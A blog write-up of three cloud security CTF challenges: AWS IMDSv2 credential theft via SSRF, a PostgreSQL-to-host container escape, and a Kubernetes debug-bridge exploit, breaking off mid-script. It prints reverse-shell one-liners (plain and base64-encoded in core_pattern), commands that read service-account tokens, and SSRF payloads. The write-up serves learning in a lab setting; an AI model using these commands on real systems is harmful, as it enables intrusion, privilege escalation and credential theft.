---
layout: post
title:  cloud security championship ctf writeup
tags: [ctf,security]
---

cloud security championship ctf writeup.

# Perimeter Leak
[challenge 1](https://www.cloudsecuritychampionship.com/challenge/1)
First, I didn't get what the author wants to test.

The title is Perimeter Leak and the author said AWS data perimeters. So I try to search for AWS data perimeters. And it's some kind of policys.

Then I say the web app is Spring Boot Actuator. So I try to leak something with the [endpoints](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html).

After I tried `env`,`metrics` and some more, I only get the bucket name.
```
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env

"BUCKET":{"value":"challenge01-470f711"
```

Then I try to use `s3` to  access the bucket. I got `aws login`. Well, I don't have the credentials.

So I'm stuck. And I used the hint 1.
```
Spring Boot Actuator applications may be misconfigured to allow access to /actuator/mappings
```
Well. It's another endpoint. It's in the previous endpoints which I didn't try.

We can see a 'proxy' endpoint and `url` parameter. And we know that, it's SSRF.

I tried to use the [aws ssrf skills](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/). But I can't get the credentials.

Stuck again. Then I tried hint 2. 
```
The endpoint /proxy can be used to obtain IMDSv2 credentials
```

Then I asked DeepSeek about IMDSv2. It's used to prevent the SSRF from access IMDS.

As I don't have much experience about IMDSv2. I also tried to search IMDSv2. There is an article about how to exploit the [IMDSv2 with ssrf](https://medium.com/@harshagv/uncovering-cloud-security-flaws-how-ssrf-exploits-imdsv2-limitations-in-aws-75bd4201786b).

First, we need a PUT request to get the token.

```
curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token"

```

Then we try to get the credentials with the token.

```

curl -H "X-aws-ec2-metadata-token: YOURTOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/"


curl -H "X-aws-ec2-metadata-token: YOURTOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368"

{
  "Code" : "Success",
  "LastUpdated" : "2026-05-09T01:56:11Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASKEY",
  "SecretAccessKey" : "SCKEY",
  "Token" : "IQoJbTOKEN5qk=",
  "Expiration" : "2026-05-09T08:11:48Z"
}

```

Then we try to use [security-credentials](https://hackingthe.cloud/aws/general-knowledge/using_stolen_iam_credentials/).


```

export AWS_ACCESS_KEY_ID=ASKEY
export AWS_SECRET_ACCESS_KEY=SCKEY
export AWS_SESSION_TOKEN=IQoJbTOKEN5qk=
```

We can use this command to check.
`aws sts get-caller-identity`

Then we try to access the s3 bucket. We get the bucket name from the `env` endpoint.

```
aws s3 ls s3://challenge01-470f711

aws s3 cp s3://challenge01-470f711/hello.txt hello.txt
```

We can get the hello file. But when we try flag, we get 403.
```

aws s3 cp s3://challenge01-470f711/private/flag.txt .

fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

The medium article told us to check policy.
```
aws s3api get-bucket-policy --bucket challenge01-470f711
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Deny\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::challenge01-470f711/private/*\",\"Condition\":{\"StringNotEquals\":{\"aws:SourceVpce\":\"vpce-0dfd8b6aa1642a057\"}}}]}"
}
```
We asked DeepSeek about the policy. It says you need to access from the vpc `vpce-0dfd8b6aa1642a057`. And It also told us that you can use presign to sign the file.
```
# 生成一个默认有效期为1小时的预签名URL
aws s3 presign s3://challenge01-470f711/private/your-private-file.txt
```
Then we tried to sign the flag file. And we still need to access the url with the proxy. So you need to urlencode the url.

```
curl "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=https%3A%2F%2Fchallenge01-470f711.s3.amazonaws.com%2Fprivate%2Fflag.txt%3FX-Amz-Algorithm%3D..."
```
Bingo. The flag shows.

It's a traditional SSRF technique. But it's using the IMDSv2. So we need a SSRF which access PUT method and also custom headers. Then we can get the credentials. The interesting part is data perimeters policy. We can use presigned URLs with the ssrf endpoint. 


# Contain Me If You Can
This one is difficult. 

I tried to get some infomations about the system.
`ls -la /`

`cat /proc/mounts | xargs -d ',' -n 1 | grep workdir`
```
workdir=/var/lib/docker/overlay2/69bdc276831c13a1fe558b37e77167b3bff27487f7425ee46f82444e1ae070f2/work 0 0
```
Didn't get much info. So I asked for a hint.
Hint 1
```
Can you spot any interesting established network connections?
```
Then I try to get some network information.

```
netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 b7f6fbdc0560:45578      postgres_db.:postgresql ESTABLISHED
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path

netstat -tunapl
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:42547        0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.19.0.3:45578        172.19.0.2:5432         ESTABLISHED -                   
udp        0      0 127.0.0.11:49887        0.0.0.0:*                           -      

```
Well, I see a `postgres_db`.
Then I try to connect to the db directly. I tried blank password and the default password and some simple password. And I can't login.
Then I try to dump the traffic. I can see a `select` command. At first sight, I thought it's network tampering and network replay. Try to change the sql command with some evil command and resent. Then I try to find some existing tools. Seems it's a dead end. I also find that there are some ctfer who also tried this way and failed.
```
psql -h 172.19.0.2

tcpdump -A -i any -s 0 host 172.19.0.2 and port 5432

```
So, we need more hint. Hint 2
```
This network connection is plain-text. Can you think of a way to take advantage of it?
```
No new idea. We tried to capture the traffic.
More hint. Hint 3
```
`COPY ... FROM PROGRAM` can be used to execute arbitrary code in PostgreSQL.
```
So we can use this command to exec command. Question is how? Tamper the traffic?

Try to get some  help with search engine.

This [writeup](https://medium.com/@danielndias/challenge-2-contain-me-if-you-can-b0b47226c5eb) suggests that we can kill the connection. And when the connection reconnects, we can capture the credentials.
```
tcpkill -i any host 172.19.0.2 and port 5432
tcpdump -A -i any -s 0  host 172.19.0.2 and port 5432 
```
From  the dump, we can see a string `SecretPostgreSQLPassword`. Then I try to login with it, but I still can't login.
Then I give the dump to DeepSeek, it told me the username and databasename.

Then we log in to the database.
```

psql -h 172.19.0.2 -U user 

psql "host=172.19.0.2 port=5432 user=user dbname=mydatabase"
```
The psql shell is different from mysql shell. You need to use \ to start a command. So I asked DeepSeek to create some table and exec the copy command.

```
CREATE TABLE simple_table (
    content TEXT
);

\copy simple_table from program 'ls /'

select * from simple_table;


\copy simple_table from program 'cat /flag'

\copy simple_table from program 'id'
```
We didn't get the flag. We learned that we are still in a container later.

Get more hint.Hint 4
```
The PostgreSQL administrator of this environment needed a really easy and convenient way to become root for maintenance purposes.
```
Then I try to get database config to get some root password. And this not the right direction.
```

SHOW config_file;
               config_file                
------------------------------------------
 /var/lib/postgresql/data/postgresql.conf

\copy simple_table from program 'cat /var/lib/postgresql/data/postgresql.conf'

SHOW hba_file;
               hba_file               
--------------------------------------
 /var/lib/postgresql/data/pg_hba.conf

\copy simple_table from program 'cat /var/lib/postgresql/data/pg_hba.conf'
```


Get more hint from [writeup 2](https://tresscross.blog/contain-me-if-you-can-wiz-cloud-ctf-july/) and [writeup 3](https://manesec.github.io/2025/08/24/2025/61-WIZ-Contain-Me-If-You-Can/).

We need to get a reverse shell with the pg command. Then we need to do a docker escape. In the end we get the flag.

We need reverse shells and the writeup suggests we use `tmux`.
```
apt update
apt install tmux

tmux
ctrl+b, %
# ctrl+b, arrow key to switch 

ctrl+b "

# get ip
ifconfig | grep 172
172.19.0.3

# start a listener
nc -lvnp 7000


CREATE TABLE shell(t TEXT);
COPY shell FROM PROGRAM '/bin/bash -c "/bin/bash -i >& /dev/tcp/172.19.0.3/7000 0>&1"' ;
```

Now we get a reverse shell from the db.
```
032c93ff87db:~/data$ whoami
whoami
postgres
032c93ff87db:~/data$ id
id
uid=70(postgres) gid=70(postgres) groups=10(wheel),70(postgres)
032c93ff87db:~/data$ 
```
Writeup3 suggests we use `Linpeas` to check the container.
```
032c93ff87db:~/data$ sudo su
sudo su
whoami
root

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

chmod +x linpeas.sh
bash linpeas.sh

./linpeas.sh > output.txt
```
It's not easy to see the results with current tmux settings. You need to change the setting to see more.
So we just skip this part and go to the `/proc/sys/kernel/core_pattern` part.


First we tried this payload, but can't get a shell
```
echo '|/bin/bash -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOS4wLjMvOTAwMCAwPiYx | base64 -d | /bin/bash"' > /proc/sys/kernel/core_pattern
sh -c 'kill -11 "$$"'

nc -lvnp 9000
```

Then we tried a payload from [wiz blog](https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r). It works.
```
echo '|/bin/bash -c echo${IFS%%??}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOS4wLjMvOTAwMCAwPiYx|base64${IFS%%??}-d|/bin/bash' > /proc/sys/kernel/core_pattern 

sh -c 'kill -11 "$$"' 
```

So what works here is that we try to write a command to the core_pattern. And then we sent to a crash command. When the system get the crash, it will exec the command we write in the core_pattern. Then we get a shell in the host machine.

Some more [techniques](https://juggernaut-sec.com/docker-breakout-lpe/).


```
# check the system
uname
Linux
cat /etc/issue
Welcome to Alpine Linux 3.21
Kernel \r on an \m (\l)

# install some package
sudo apk add curl
sudo apk add python3

# get a new tty
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL + Z         #backgrounds netcat session
stty raw -echo
fg               #brings netcat session back to the foreground
export TERM=xterm


#wget https://github.com/cdk-team/CDK/releases/download/v1.5.6/cdk_linux_amd64


sudo -l
sudo su

cat /proc/mounts | grep 'proc'
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0

ls -l /proc/sys/kernel/core_pattern

```

It's a really hard one if you don't have ctf experience.
We learned that we can use `copy . from program` to exec command in pgsql and we can use `core_pattern` to privilege escalate to the host.


# Game of Pods
This one is difficult. You can check with [this one](https://tresscross.blog/game-of-pods-wiz-cloud-ctf-october/) and [that one](https://www.skybound.link/2025/11/wiz-cloud-security-championship-october-2025/).
I just reproduce it with their help.

In the beginning, I thought it was some priesc problem.  So I tried to use cdk to find some vulns.

```
root@test:~# whoami
root
root@test:~# uname
Linux
root@test:~# cat /etc/issue
Welcome to Alpine Linux 3.18
Kernel \r on an \m (\l)

root@test:~# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/34/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/10/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/7/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/6/fs,upperdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/fs,workdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime)
/dev/vdb on /etc/hosts type ext4 (rw,relatime)
/dev/vdb on /dev/termination-log type ext4 (rw,relatime)
/dev/vdb on /etc/hostname type ext4 (rw,relatime)
/dev/vdb on /etc/resolv.conf type ext4 (rw,relatime)
shm on /dev/shm type tmpfs (rw,relatime,size=65536k)
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=1011268k)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/scsi type tmpfs (ro,relatime)
tmpfs on /sys/firmware type tmpfs (ro,relatime)
```

```
root@test:~# ./cdk evaluate
CDK (Container DucK)
CDK Version(GitCommit): e8ec183dc9da4968794b3922e6d474ab49215303
Zero-dependency cloudnative k8s/docker/serverless penetration toolkit by cdxy & neargle
Find tutorial, configuration and use-case in https://github.com/cdk-team/CDK/

[  Information Gathering - System Info  ]
2026/05/11 06:28:43 current dir: /root
2026/05/11 06:28:43 current user: root uid: 0 gid: 0 home: /root
2026/05/11 06:28:43 hostname: test
2026/05/11 06:28:43 alpine alpine 3.18.12 kernel: 6.1.128

[  Information Gathering - Services  ]
2026/05/11 06:28:43 sensitive env found:
        KUBERNETES_SERVICE_PORT_HTTPS=443
2026/05/11 06:28:43 sensitive env found:
        KUBERNETES_SERVICE_PORT=443
2026/05/11 06:28:43 sensitive env found:
        KUBERNETES_PORT_443_TCP=tcp://10.43.1.1:443
2026/05/11 06:28:43 sensitive env found:
        KUBERNETES_PORT_443_TCP_PROTO=tcp
2026/05/11 06:28:43 sensitive env found:
        KUBERNETES_PORT_443_TCP_ADDR=10.43.1.1
2026/05/11 06:28:43 sensitive env found:
        KUBERNETES_SERVICE_HOST=10.43.1.1
2026/05/11 06:28:43 sensitive env found:
        KUBERNETES_PORT=tcp://10.43.1.1:443
2026/05/11 06:28:43 sensitive env found:
        KUBERNETES_PORT_443_TCP_PORT=443

[  Information Gathering - Commands and Capabilities  ]
2026/05/11 06:28:43 Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):
        CapInh: 0000000000000000
        CapPrm: 00000000a80425fb
        CapEff: 00000000a80425fb
        CapBnd: 00000000a80425fb
        CapAmb: 0000000000000000
        Cap decode: 0x00000000a80425fb = CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP
[*] Maybe you can exploit the Capabilities below:
2026/05/11 06:28:43 available commands:
        curl,wget,nc,kubectl,find,ps,vi,mount,fdisk,base64

[  Information Gathering - Mounts  ]
0:90 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/34/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/10/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/7/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/6/fs,upperdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/fs,workdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/work
0:116 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
0:117 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
0:118 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
0:46 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
0:51 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
0:25 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - cgroup2 cgroup rw
254:16 /volumes/b081761fac04d12dc6807c570f7a3693d9d84c4ac1f8b6bb8a2363b96a0b3e35/_data/pods/4f0c0d93-f622-47ad-b040-3f784afcc7ac/etc-hosts /etc/hosts rw,relatime - ext4 /dev/vdb rw
254:16 /volumes/b081761fac04d12dc6807c570f7a3693d9d84c4ac1f8b6bb8a2363b96a0b3e35/_data/pods/4f0c0d93-f622-47ad-b040-3f784afcc7ac/containers/test/7c2efc1b /dev/termination-log rw,relatime - ext4 /dev/vdb rw
254:16 /volumes/293cceff08dddb798ca16b1f7eae17a8543564df61f0470a8e6bdc7a129302fe/_data/agent/containerd/io.containerd.grpc.v1.cri/sandboxes/1bda206f479be85808ca7e0c517bff2d9b046330386be3eb4acc12e458a4ed3f/hostname /etc/hostname rw,relatime - ext4 /dev/vdb rw
254:16 /volumes/293cceff08dddb798ca16b1f7eae17a8543564df61f0470a8e6bdc7a129302fe/_data/agent/containerd/io.containerd.grpc.v1.cri/sandboxes/1bda206f479be85808ca7e0c517bff2d9b046330386be3eb4acc12e458a4ed3f/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/vdb rw
0:38 / /dev/shm rw,relatime - tmpfs shm rw,size=65536k
0:37 / /run/secrets/kubernetes.io/serviceaccount ro,relatime - tmpfs tmpfs rw,size=1011268k
0:116 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw
0:116 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw
0:116 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw
0:116 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw
0:116 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw
0:119 / /proc/acpi ro,relatime - tmpfs tmpfs ro
0:117 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
0:117 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
0:117 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
0:120 / /proc/scsi ro,relatime - tmpfs tmpfs ro
0:121 / /sys/firmware ro,relatime - tmpfs tmpfs ro

[  Information Gathering - Net Namespace  ]
        container net namespace isolated.

[  Information Gathering - Sysctl Variables  ]
2026/05/11 06:28:43 net.ipv4.conf.all.route_localnet = 0

[  Information Gathering - DNS-Based Service Discovery  ]
error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.1.10:53: no such host
error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.1.10:53: no such host

[  Discovery - K8s API Server  ]
2026/05/11 06:28:43 checking if api-server allows system:anonymous request.
err found in post request, error response code: 401 Unauthorized.
        api-server forbids anonymous request.
        response:{"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}


[  Discovery - K8s Service Account  ]
        service-account is available
2026/05/11 06:28:43 trying to list namespaces
err found in post request, error response code: 403 Forbidden.

[  Discovery - Cloud Provider Metadata API  ]
2026/05/11 06:28:44 failed to dial Volcano Engine (Volcengine) API.
2026/05/11 06:28:45 failed to dial Alibaba Cloud API.
2026/05/11 06:28:46 failed to dial Azure API.
2026/05/11 06:28:46 failed to dial Google Cloud API.
2026/05/11 06:28:46 failed to dial Tencent Cloud API.
2026/05/11 06:28:47 failed to dial OpenStack API.
2026/05/11 06:28:48 failed to dial Amazon Web Services (AWS) API.
2026/05/11 06:28:49 failed to dial ucloud API.

[  Exploit Pre - Kernel Exploits  ]
2026/05/11 06:28:49 refer: https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded



[  Information Gathering - Container Security  ]
2026/05/11 06:28:50 Namespace isolation status:
        cgroup: NOT isolated (shared with host, cgroup:[4026532518])
        ipc: NOT isolated (shared with host, ipc:[4026532247])
        mnt: NOT isolated (shared with host, mnt:[4026532516])
        net: NOT isolated (shared with host, net:[4026532162])
        pid: NOT isolated (shared with host, pid:[4026532517])
        uts: NOT isolated (shared with host, uts:[4026532246])
2026/05/11 06:28:50 Seccomp: disabled
2026/05/11 06:28:50 Seccomp: kernel supports Seccomp
2026/05/11 06:28:50 Seccomp: kernel config CONFIG_SECCOMP=y
2026/05/11 06:28:50 SELinux: not detected (no selinuxfs)
2026/05/11 06:28:50 AppArmor: kernel config CONFIG_SECURITY_APPARMOR=n
2026/05/11 06:28:50 AppArmor: no explicit AppArmor boot parameter found
2026/05/11 06:28:50 AppArmor: module not loaded
2026/05/11 06:28:50 AppArmor: container profile: kernel

```
And I also tried linpeas and some nmap scan.
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

Nmap scan report for 10.42.0.1
Host is up (0.00011s latency).
MAC Address: E6:75:64:78:01:C3 (Unknown)
Nmap scan report for 10.42.0.3
Host is up (0.000064s latency).
MAC Address: 5E:7F:D0:45:B8:A7 (Unknown)
Nmap scan report for 10.42.0.4
Host is up (0.000036s latency).
MAC Address: 5E:E4:12:D5:40:40 (Unknown)
Nmap scan report for 10.42.0.5
Host is up (0.000032s latency).
MAC Address: E2:1A:25:F8:8E:8F (Unknown)
```

Then, Hint 1
```
Images tend to live together in herds called registries
```

I asked DeepSeek how to get information about k8s registries.
```
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

APISERVER="https://kubernetes.default.svc"

curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
     -H "Authorization: Bearer $TOKEN" \
     $APISERVER/api/v1/namespaces/default/pods
```

Get Hint 2
```
I always forget the proper way to construct URLs in Golang. I guess %s will do the trick.
```
No idea. So I tried to find some writeup to get some ideas.

```
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

env

# get some info about k8s
kubectl auth whoami

kubectl auth can-i --list
kubectl get pods
kubectl get pod test -o yaml
```

We get the registries url. And the writeup suggests a tool called `oras`. And then we try to get `k8s-debug-bridge.go`.
```
oras repo ls hustlehub.azurecr.io

oras copy hustlehub.azurecr.io/k8s-debug-bridge:latest --to-oci-layout k8s-debug-bridge/

jq . k8s-debug-bridge/index.json

jq . k8s-debug-bridge/blobs/sha256/a705d5c6dd51fcfc0c8c7b8989df26b02a88740ae5b696fa8e65ac31f427b72e
jq . k8s-debug-bridge/blobs/sha256/7162697db986f5e02d9091e5f29193a473f5fbd2d7b186243813052c9b7b5ed7

mkdir /tmp/rootfs
tar -xzf k8s-debug-bridge/blobs/sha256/44cf07d57ee4424189f012074a59110ee2065adfdde9c7d9826bebdffce0a885 -C /tmp/rootfs
tar -xzf k8s-debug-bridge/blobs/sha256/049d988b9bf0a21ad8597ad57e538949be03f703977d21d9d30b7da3fc92f983 -C /tmp/rootfs
tar -xzf k8s-debug-bridge/blobs/sha256/af22b6a1bf08e5477608575f8890ef7cbc61994011a54d37a5edd5630a6b9a6f -C /tmp/rootfs
tar -xzf k8s-debug-bridge/blobs/sha256/f055869862fb70dd5a7f7c2b9ac1e9d50b886d9a3b55c1e288ad1ba76644bdae -C /tmp/rootfs

ls /tmp/rootfs/root/

cat /tmp/rootfs/root/k8s-debug-bridge.go
```
So I try to get the ip and request it.
```
root@test:~# curl 10.42.0.4:8080
404 page not found
root@test:~# curl 10.42.0.5:8080
404 page not found

root@test:~# curl 10.42.0.4:8080/logs
Method not allowed
root@test:~# curl 10.42.0.4:8080/checkpoint
Method not allowed

curl -X POST http://10.42.0.4:8080/logs \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "10.42.0.2",
    "pod": "app-blog",
    "namespace": "app",
    "container": "app-blog"
  }'

curl -X POST http://10.42.0.4:8080/checkpoint \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "10.244.2.8",
    "pod": "critical-pod",
    "namespace": "app",
    "container": "app-container"
  }'
```
The `node_ip` is not right.

From the write up, we know the ip is `172.30.0.2`.
```
coredns-enum --mode bruteforce --cidr 10.43.0.0/16 --zone cluster.local

curl -X POST http://10.43.1.168:8080/logs \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "172.30.0.2",
    "pod": "app-blog",
    "namespace": "app",
    "container": "app-blog"
  }'

curl -X POST http://10.43.1.168:8080/checkpoint \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "10.43.1.168",
    "pod": "critical-pod",
    "namespace": "app",
    "container": "app-container"
  }'

curl -X POST http://10.42.0.4:8080/checkpoint \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "10.43.1.168",
    "pod": "critical-pod",
    "namespace": "app",
    "container": "app-container"
  }'

curl http://k8s-debug-bridge.app/logs -d '{"node_ip": "172.30.0.2", "pod": "app-blog", "namespace": "app", "container": 
"app-blog"}'

curl http://10.43.1.168/logs -d '{"node_ip": "172.30.0.2", "pod": "app-blog", "namespace": "app", "container": 
"app-blog"}'

curl http://10.42.0.4:8080/logs -d '{"node_ip": "172.30.0.2", "pod": "app-blog", "namespace": "app", "container": 
"app-blog"}'

curl 10.43.1.36

curl -X POST http://10.42.0.4:8080/logs \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "172.30.0.2",
    "pod": "app-blog",
    "namespace": "app",
    "container": "app-blog"
  }'

# not working in para `container` 

curl -X POST http://10.42.0.4:8080/checkpoint \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "172.30.0.2",
    "pod": "app-blog",
    "namespace": "app",
    "container": "../../../../../../run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#"
  }'


curl -X POST http://10.43.1.168:8080/checkpoint \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "172.30.0.2",
    "pod": "app-blog",
    "namespace": "app",
    "container": "../../../../run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#"
  }'

curl -X POST http://k8s-debug-bridge.app:8080/checkpoint \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "172.30.0.2",
    "pod": "app-blog",
    "namespace": "app",
    "container": "../../../../run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#"
  }'


curl -X POST http://10.43.1.168/checkpoint \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "172.30.0.2",
    "pod": "app-blog",
    "namespace": "app",
    "container": "../../../../run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#"
  }'
```
You need to abuse `node_ip` to get token and `ca.crt`.
```

curl -X POST http://10.43.1.168/checkpoint \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "172.30.0.2:10250/run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#",
    "pod": "app-blog",
    "namespace": "app",
    "container": "a"
  }'

curl -X POST http://10.43.1.168/checkpoint \
  -H "Content-Type: application/json" \
  -d '{
    "node_ip": "172.30.0.2:10250/run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt#",
    "pod": "app-blog",
    "namespace": "app",
    "container": "a"
  }'
```

base64encode `ca.crt` to get `certificate-authority-data`.
```
cat <<EOF > app-kubeconfig.yaml
apiVersion: v1
kind: Config
clusters:
- cluster:
    certificate-authority-data: LS0tLS_CHANGE_TO_YOUR_CERT_LS0=
    server: https://kubernetes.default.svc.cluster.local 
  name: my-cluster
contexts:
- context:
    cluster: my-cluster
    namespace: app
    user: app-sa
  name: app-context
current-context: app-context
users:
- name: app-sa
  user:
    token: eyJhbGciOiJS_CHANGE_TO_YOUR_TOKEN_-HXFAjS4YQUuTcibhxw
EOF


kubectl --kubeconfig=app-kubeconfig.yaml auth can-i --list

kubectl --kubeconfig=app-kubeconfig.yaml get secrets -n app -o yaml

cat <<EOF > secret.yml
apiVersion: v1
kind: Secret
metadata:
  name: debug-bridge-token
  namespace: app
  annotations:
    kubernetes.io/service-account.name: "k8s-debug-bridge"
type: kubernetes.io/service-account-token
EOF

kubectl --kubeconfig=app-kubeconfig.yaml apply -f secret.yml

TOKEN=$(kubectl --kubeconfig=app-kubeconfig.yaml -n app get secret debug-bridge-token -o jsonpath='{.data.token}' | base64 -d)

kubectl --token $TOKEN auth can-i --list

export TOKEN

cat <<'EOF' > script.sh
#!/bin/bash

set -euo pipefail

readonly NODE="noder"                 # hostname of the worker node
readonly API_SERVER_PORT=6443         # API server port
readonly API_SERVER_IP="172.30.0.2"   # API server IP
readonly BEARER_TOKEN="${TOKEN}"      # service account token (must be exported)

# Fetch node status
curl -k \
  -H "Authorization: Bearer ${BEARER_TOKEN}" \
  -H "Content-Type: application/json" \
  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/status" \
  > "${NODE}-orig.json"

# Patch kubelet port in status
sed "s/\"Port\": 10250/\"Port\": ${API_SERVER_PORT}/g" \
